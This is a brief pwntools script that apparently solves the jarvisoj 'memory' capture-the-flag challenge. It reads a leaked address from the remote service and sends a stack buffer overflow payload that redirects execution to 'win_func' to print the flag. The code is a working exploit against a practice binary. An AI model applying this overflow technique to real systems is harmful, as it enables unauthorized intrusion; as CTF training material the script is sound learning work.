#!/usr/bin/env python
# -*-coding=utf-8-*-
from pwn import *
context.log_level = 'debug'
io = remote("pwn2.jarvisoj.com", 9876)
elf = ELF("./memory")

io.recvuntil("? : \n")
catflag = int(io.recvline(),16)
sys = elf.symbols["win_func"]
# print hex(address)

payload = 'a' * 0x17 + p32(sys) + p32(catflag) *2
io.recvuntil("> ")
io.sendline(payload)
# io.recv()
io.interactive()

